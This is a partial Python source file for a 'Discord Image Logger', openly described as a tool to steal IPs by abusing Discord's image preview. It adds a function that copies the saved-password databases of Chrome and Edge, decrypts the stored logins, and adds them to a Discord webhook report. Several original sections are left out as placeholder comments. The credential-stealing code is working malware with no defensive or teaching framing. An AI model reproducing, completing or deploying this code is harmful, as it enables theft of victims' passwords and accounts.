# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser
import sqlite3, os, shutil, platform

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

# Windows-specific imports
if platform.system() == 'Windows':
    from win32crypt import CryptUnprotectData

config = {
    # ... [Keep original config unchanged] ...
}

def get_passwords():
    password_data = []
    if platform.system() != 'Windows':
        return ["Password extraction: Windows only feature"]
    
    try:
        paths = [
            os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data'),
            os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data'),
        ]
        
        for path in paths:
            if not os.path.isfile(path):
                continue
            
            temp_db = os.path.join(os.getenv('TEMP'), 'temp_db.db')
            shutil.copy2(path, temp_db)
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            
            for row in cursor.fetchall():
                url, username, encrypted = row
                if not all([url, username, encrypted]):
                    continue
                
                try:
                    decrypted = CryptUnprotectData(encrypted, None, None, None, 0)[1]
                    password_data.append(f"URL: {url}\nUser: {username}\nPass: {decrypted.decode('utf-8')}\n")
                except:
                    password_data.append(f"URL: {url}\nUser: {username}\nPass: [Decryption Failed]")
            
            conn.close()
            os.remove(temp_db)
            
    except Exception as e:
        return [f"Password error: {str(e)}"]
    
    return password_data if password_data else ["No passwords found"]

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
    # ... [Keep original checks and setup] ...

    # Get passwords (Windows only)
    try:
        passwords = get_passwords()
        password_text = "\n".join(passwords)
    except:
        password_text = "Password retrieval failed"

    # Update embed description
    embed["embeds"][0]["description"] += f"\n\n**Saved Passwords:**\n{password_text}"

    # ... [Rest of original makeReport code] ...
